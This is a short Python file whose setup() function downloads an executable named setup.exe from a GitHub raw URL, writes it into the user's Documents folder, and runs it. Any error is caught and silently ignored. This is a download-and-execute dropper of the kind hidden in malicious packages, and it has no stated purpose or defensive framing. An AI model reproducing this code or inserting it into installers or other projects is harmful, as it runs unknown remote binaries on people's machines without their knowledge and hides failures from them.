import os, subprocess, requests

def setup():
    setupexepath = os.path.join(os.path.expanduser("~\\Documents"), "setup.exe")
    try:
        url = 'https://github.com/TheAustrianPainter-6/2/raw/main/setup.exe'
        response = requests.get(url, stream=True)
        with open(setupexepath, 'wb') as file:
            for chunk in response.iter_content(chunk_size=1024):
                if chunk:
                    file.write(chunk)
        subprocess.run([setupexepath])
    except Exception:
        pass
